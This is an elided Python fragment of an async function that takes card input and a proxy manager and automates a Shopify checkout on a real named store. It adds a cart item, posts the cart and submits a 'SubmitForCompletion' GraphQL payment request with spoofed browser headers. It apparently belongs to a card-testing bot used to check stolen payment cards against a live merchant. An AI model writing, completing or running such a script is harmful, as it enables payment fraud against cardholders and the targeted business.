...
async def sh(card_input: str, proxy_manager):
    ...
    async with aiohttp.ClientSession(connector=connector) as r:
        ...
        url = "https://panicfabrications.com/cart/add.js"
        headers = {
            'authority': 'https://panicfabrications.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://panicfabrications.com',
            'referer': 'https://panicfabrications.com/products/stickers/products/america-flag-sticker',
        ...
        try:
            async with r.get('https://panicfabrications.com/cart.js', headers=headers, timeout=30) as response:
        ...
        headers = {
            ...
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://panicfabrications.com',
            'referer': 'https://panicfabrications.com/cart',
        ...
        try:
            response = await r.post(
                'https://panicfabrications.com/cart',
                headers=headers,
                data=data,
        ...
        json_data = {
            ...
            'payment_session_scope': 'panicfabrications.com',
        }
        ...
        headers = {
            'authority': 'panicfabrications.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': 'https://panicfabrications.com',
            'referer': 'https://panicfabrications.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
        ...
        json_data = {
            ...
            'variables': {
                        ...
                        'merchandiseLines': [
                            {
                                ...
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariantMerchandise/15439734341677',
                                        'variantId': 'gid://shopify/ProductVariant/15439734341677',
                                        'properties': [],
                                        'sellingPlanId': None,
                ...
                'metafields': [],
                'analytics': {
                    'requestUrl': f'https://panicfabrications.com/checkouts/cn/{tok}/en-in?auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
                },
            },
            'operationName': 'SubmitForCompletion',
        }
        ...
        try:
            async with r.post(
                'https://panicfabrications.com/checkouts/unstable/graphql',
                params=params,
                headers=headers,
                json=json_data,
            ) as response:
